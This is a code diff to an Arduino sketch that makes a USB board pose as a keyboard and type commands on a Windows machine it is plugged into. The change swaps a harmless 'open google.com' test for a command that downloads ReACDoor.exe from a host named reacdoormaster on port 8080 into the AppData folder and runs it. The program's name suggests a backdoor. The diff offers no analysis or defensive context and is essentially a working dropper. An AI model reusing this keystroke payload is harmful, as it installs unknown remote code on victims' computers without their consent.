@@ -8,26 +8,26 @@ void setup() {
   pinMode(LED_BUILTIN, OUTPUT);
   digitalWrite(LED_BUILTIN, LOW);
 
-  Serial.begin(9600);
+
+  //Serial.begin(9600);
 
   Keyboard.begin(KeyboardLayout_de_DE);
   USB.begin();
 
   delay(1000);
 
- 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
   Keyboard.releaseAll();
   delay(1000);
   Keyboard.println("cmd");
   delay(1000);
-  Keyboard.println("start http://google.com && exit");
+  Keyboard.println(R"(cd %appdata% && curl -O http://reacdoormaster:8080/ReACDoor.exe && (start ReACDoor.exe) & exit)");
   //Keyboard.press(KEY_RETURN);
   //Keyboard.releaseAll();
 }
 
 void loop() {
-  Serial.println("Test");
+  //Serial.println("Test");
   delay(1000);
 }
